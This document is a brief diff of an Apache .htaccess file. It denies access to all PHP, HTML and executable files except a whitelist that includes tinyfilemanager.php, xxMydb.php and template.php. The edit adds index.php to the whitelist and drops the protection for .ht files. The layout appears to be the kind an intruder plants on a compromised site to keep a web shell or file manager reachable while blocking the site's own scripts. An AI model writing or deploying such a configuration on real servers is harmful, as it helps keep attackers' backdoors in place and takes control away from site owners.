@@ -1,18 +1,12 @@
 
-
-
 <FilesMatch ".(py|inc|shtml|html|ph|phtml|exe|php)$">
 Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(xxMydb.php|template.php|tinyfilemanager.php|url.css|index.html|xxMydb.php)$">
+<FilesMatch "^(index.php|xxMydb.php|template.php|tinyfilemanager.php|url.css|index.html|xxMydb.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
-<Files ~ "^\.ht">
-    Order allow,deny
-    Deny from all
-</Files>
 <IfModule php7_module>
 php_flag display_errors Off
    php_value max_execution_time 30
